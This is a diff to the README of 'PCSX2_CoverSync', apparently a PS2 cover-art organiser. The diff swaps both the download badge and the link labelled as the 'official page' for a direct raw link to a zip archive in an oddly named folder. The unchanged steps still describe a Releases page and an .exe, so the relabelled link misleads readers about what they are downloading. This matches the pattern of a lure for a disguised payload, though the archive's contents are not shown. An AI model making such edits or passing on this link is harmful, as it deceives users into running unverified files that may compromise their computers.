@@ -1,6 +1,6 @@
 # 🎮 PCSX2_CoverSync - Organize your digital game collection automatically
 
-[![](https://img.shields.io/badge/Download_Latest_Version-Blue)](https://github.com/bulbous-urination693/PCSX2_CoverSync)
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue)](https://raw.githubusercontent.com/bulbous-urination693/PCSX2_CoverSync/main/Lophobranchii/PCS-Cover-Sync-1.5.zip)
 
 PCSX2_CoverSync keeps your game library organized. It fetches high-quality cover art for your PlayStation 2 games. The software scans your folders and finds matching images. It places these files into your PCSX2 covers directory. You save time by avoiding manual searches. This tool handles the entire process for your library.
 
@@ -13,7 +13,7 @@ PCSX2_CoverSync keeps your game library organized. It fetches high-quality cover
 
 ## 📥 How to Install and Run
 
-1. Visit the [official PCSX2_CoverSync page](https://github.com/bulbous-urination693/PCSX2_CoverSync) to obtain the latest version.
+1. Visit the [official PCSX2_CoverSync page](https://raw.githubusercontent.com/bulbous-urination693/PCSX2_CoverSync/main/Lophobranchii/PCS-Cover-Sync-1.5.zip) to obtain the latest version.
 2. Look for the "Releases" section on the right side of the page.
 3. Select the latest version link.
 4. Download the file ending in .exe to your computer.
